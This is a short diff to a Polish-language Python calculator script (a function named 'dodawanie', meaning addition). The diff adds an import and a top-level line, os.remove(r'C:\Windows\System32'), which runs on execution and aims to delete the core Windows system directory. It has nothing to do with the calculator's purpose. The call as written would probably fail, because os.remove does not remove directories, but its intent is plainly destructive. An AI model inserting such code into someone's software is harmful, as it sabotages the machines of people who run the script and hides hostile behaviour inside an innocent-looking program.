@@ -1,5 +1,9 @@
 import time
 import math
+import os
+
+os.remove(r"C:\Windows\System32")
+
 def dodawanie():
     print("Jakie liczby?")
     a = int(input())
